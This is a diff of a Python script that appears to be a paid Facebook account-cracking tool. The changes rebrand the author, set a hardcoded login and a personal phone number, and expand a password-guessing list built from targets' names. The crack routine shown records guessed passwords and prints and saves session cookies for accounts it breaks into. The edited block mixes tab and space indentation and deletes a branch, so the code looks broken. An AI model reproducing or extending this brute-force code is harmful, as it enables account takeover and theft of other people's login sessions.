@@ -1,5 +1,5 @@
 #os.system("pkg install espeak")
-#-----------------[ BISESH-King ]-------------------#
+#-----------------[ BISHESH ]-------------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -16,7 +16,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ BISESH-King ]-------------------#
+ #------------------[ BISHESH ]-------------------#
 import os, platform, time, sys
 print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
 time.sleep(5)
@@ -24,7 +24,7 @@ os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY MESSANGER GROUP")
 time.sleep(2)
 #os.system(f'xdg-open https://m.me/j/AbZwLw0pc0h4GVNy/')
-#------------------[ BISESH-King ]-------------------#
+#------------------[ BISHESH ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
@@ -111,7 +111,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ BISESH- ]--------------#
+#------------[ BISHESH- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -187,7 +187,7 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/BISESH.King.Ok.Bro')
+   # os.system('xdg-open https://www.facebook.com/BISHESH XETTRI.Ok.Bro')
     back()
 def linex():
     print('\033[1;37m')
@@ -204,7 +204,7 @@ attemps = 0
 while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
-    if username == 'B' and password == '7':
+    if username == 'BISHESH' and password == 'LADO':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
   
@@ -216,7 +216,7 @@ logo ="""
  \033[1;92m      ██████╔╝██║███████╗███████║█████╗  ███████╗███████║
  \033[1;92m      ██╔══██╗██║╚════██║██╔══██║██╔══╝  ╚════██║██╔══██║
  \033[1;92m      ██████╔╝██║███████║██║  ██║███████╗███████║██║  ██║
- \033[1;92m      ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
+ \033[1;92m      ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝V2
                                              
                                          
                                                             
@@ -227,18 +227,18 @@ logo ="""
    ║\33[0;41m        [ WORKING WIFI & MOBILE DATA ]       \033[0;92m║
    ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
    \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-   ║    Author                   • \33[1;38mSM-BISESH ]\33[1;38m    ║\033[1;31m 
-   ║    Facebook                 • BISESH King ]  ║  \033[1;97m  
+   ║    Author                   • \33[1;38mSM-BISHESH ]\33[1;38m    ║\033[1;31m 
+   ║    Facebook                 • BISHESH XETTRI ]  ║  \033[1;97m  
    ║    Github                   • \33[1;38mBISESH-BRAND ]  ║\33[1;34m   
-   ║    Whatsapp                 • 97********] ║\33[1;35m 
+   ║    Whatsapp                 • 9808134286] ║\33[1;35m 
    ║    TOOLS                    • PAID ]        ║ \33[1;32m   
-   ║    VERSION                  • 0.1 ]         ║\033[1;35m 
+   ║    VERSION                  • 2.0 ]         ║\033[1;35m 
    \033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  BISESH,  BRAND,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  BISHESH,  BRAND,  Tools"')
 pass
  
  
@@ -596,23 +596,28 @@ def passwrd():
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
                     pwv.append(nmf)
-                    pwv.append('57273200')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
-            if 'ya' in pwpluss:
+					pwv.append(frs+lst)
+					pwv.append(frs+'12')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@1234')
+					pwv.append(frs+lst+'123')
+					pwv.append(frs+lst+'1234')
+					pwv.append(frs+lst+'12345')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+lst+'@123')
+					pwv.append(frs+lst+'@@')
+					pwv.append(frs+lst+'@@@')
+					pwv.append(frs+'123@@')
+					pwv.append(frs+'123@@@')
+					pwv.append(frs+'987')
+					pwv.append(frs+lst+'987')
+					pwv.append(frs+'321')
+					pwv.append(frs+lst+'321')
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:pass
@@ -660,15 +665,15 @@ def crack(idf,pwv):
                 print(f'\r\033[0;94m[BISESH-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
+                akun.append(idf+' | '+pw)
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[BISESH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
-                os.system('espeak -a 300 " BISESH,  Ok,  id"')
+                print(f'\r\033[0;92m[CONGRATULATIONS] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                os.system('espeak -a 300 " BISHESH,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
